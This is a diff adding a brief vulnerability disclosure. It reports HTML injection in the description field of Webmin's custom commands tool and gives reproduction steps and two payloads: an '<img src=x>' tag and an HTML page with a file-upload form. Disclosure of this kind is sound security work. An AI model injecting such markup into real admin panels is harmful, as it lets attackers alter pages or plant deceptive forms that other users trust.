@@ -1,0 +1,23 @@
+ this vulnerability can be reproduced by:
+- go to webmin login panel
+-login with your default credentials
+- go to tools>custom commands
+-the input field of HTML description is vulnerable to HTML injection
+
+payloads used:
+<img src=x>
+
+another tested payload
+<!DOCTYPE html>
+<html>
+<body>
+
+<form action="upload.php" method="post" enctype="multipart/form-data">
+Select image to upload:
+   <input type="file" name="fileToUpload" id="fileToUpload">
+   <input type="submit" value="Upload file" name="submit">
+</form>
+
+</body>
+</html>
+
